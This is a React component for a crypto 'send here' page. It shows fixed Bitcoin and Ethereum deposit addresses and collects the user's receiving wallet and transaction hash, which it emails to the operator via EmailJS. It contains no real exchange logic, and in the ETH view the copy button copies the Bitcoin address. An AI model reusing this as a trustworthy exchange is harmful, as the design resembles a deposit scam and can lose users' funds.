import React, { useState, useEffect, useRef } from 'react';
import emailjs from '@emailjs/browser';
import "./home.css";
import bitcoin from "./assets/bitcoin.png"
import { GrTransaction } from "react-icons/gr";
import eth from "./assets/eth.png"
import { ToastContainer, toast } from 'react-toastify';
import "react-toastify/dist/ReactToastify.css";
import { FaRegCopy } from "react-icons/fa";
import { PiTelegramLogoLight } from "react-icons/pi";
import { Link, useNavigate } from 'react-router-dom';


const Home = () => {
  const form = useRef();
  const [isLoading, setIsLoading] = useState(false); // Loading state
  const sendBitcoin = (e) => {
    e.preventDefault();
    setIsLoading(true); // Set loading state to true when form is submitted

    emailjs
      .sendForm('service_16gepef', 'template_8gb5sxs', form.current, {
        publicKey: 'olEH5CrpcR3oCtiXO',
      })
      .then(
        () => {
          console.log('SUCCESS!');
          setIsLoading(false); // Reset loading state
          navigate('/confirm');
        },
        (error) => {
          console.log('FAILED...', error.text);
          setIsLoading(false); // Reset loading state
        },
      );
  };

  const sendEth = (e) => {
    e.preventDefault();
    setIsLoading(true); // Set loading state to true when form is submitted

    emailjs
      .sendForm('service_4mz3tj2', 'template_r56oxep', form.current, {
        publicKey: 'olEH5CrpcR3oCtiXO',
      })
      .then(
        () => {
          console.log('SUCCESS!');
          setIsLoading(false); // Reset loading state
          navigate('/confirm');
        },
        (error) => {
          console.log('FAILED...', error.text);
          setIsLoading(false); // Reset loading state
        },
      );
  };



  const [alphanumericValue, setAlphanumericValue] = useState('bc1qzep6jywsxcy8qc0wgden0jg6c4fw5quwk4mqp4');
  const [buttonDisabled, setButtonDisabled] = useState(true);
  const [showMain, setShowMain] = useState(true);
  const [main2Value, setMain2Value] = useState('0x10D578D27C74CB2FDb7707D92DC88203Be62daE5'); // Value for main2

  const copyToClipboard = () => {
    navigator.clipboard.writeText(alphanumericValue);
    alert('Address copied to clipboard!');



  };

  useEffect(() => {
    setButtonDisabled(false);
  }, [alphanumericValue]);

  const handleTransactionClick = () => {
    setShowMain(!showMain);

  };

  const navigate = useNavigate()


  return (
    <div className="home">
      <ToastContainer></ToastContainer>
      <div className="home_btn">
        <Link target='_blank' to="http://www.runeshub.org/">Home</Link>
      </div>
      {showMain ? (
        <div className="main">
          <div className="main_head">
            <img src={bitcoin} alt="" />
            <span onClick={handleTransactionClick}>
              <GrTransaction />
            </span>
            <img src={eth} alt="" />
          </div>
          <form ref={form} onSubmit={sendBitcoin}>
            <div className='input'>
              <span>Send here</span>
              <p>{alphanumericValue} <span onClick={copyToClipboard} disabled={buttonDisabled}><FaRegCopy /></span></p>

              <div className="hide">

                <span onClick={copyToClipboard} disabled={buttonDisabled}>Copy Address <FaRegCopy /></span>
              </div>

            </div>
            <div className="input">
              <label htmlFor="wallet" >Receiving Wallet</label>
              <input required type="text" name="wallet" placeholder='Input Your Receiving Wallet ' />
            </div>
            <div className="input id">
              <label htmlFor="wallet">Transaction Hash</label>
              <input required name="transaction" type="text" placeholder='Input yout transaction hash/Id here' />
            </div>
            <button type='submit' disabled={isLoading}>
              {isLoading ? "Loading..." : "Completed"} <PiTelegramLogoLight />
            </button>
            <p>Transactions would take 5 minutes or less to be completed</p>
          </form>
        </div>
      ) : (
        <div className="main">
          <div className="main_head">
            <img src={eth} alt="" />
            <span onClick={handleTransactionClick}>
              <GrTransaction />
            </span>
            <img src={bitcoin} alt="" />
          </div>
          <form ref={form} onSubmit={sendEth}>
            <div className='input'>
              <span>Send here</span>
              <p>{main2Value} <span onClick={copyToClipboard} disabled={buttonDisabled}><FaRegCopy /></span></p>
              <div className="hide">

                <span onClick={copyToClipboard} disabled={buttonDisabled}>Copy Address <FaRegCopy /></span>
              </div>
            </div>
            <div className="input">
              <label htmlFor="wallet" >Receiving Wallet</label>
              <input required type="text" name="wallet" placeholder='Input Your Receiving Wallet ' />
            </div>
            <div className="input id">
              <label htmlFor="wallet">Transaction Hash</label>
              <input required name="transaction" type="text" placeholder='Input yout transaction hash/Id here' />
            </div>
            <button type='submit' disabled={isLoading}>
              {isLoading ? "Loading..." : "Completed"} <PiTelegramLogoLight />
            </button>
            <p>Transactions would take 5 minutes or less to be completed</p>
          </form>
        </div>
      )}
    </div>
  )
}

export default Home;
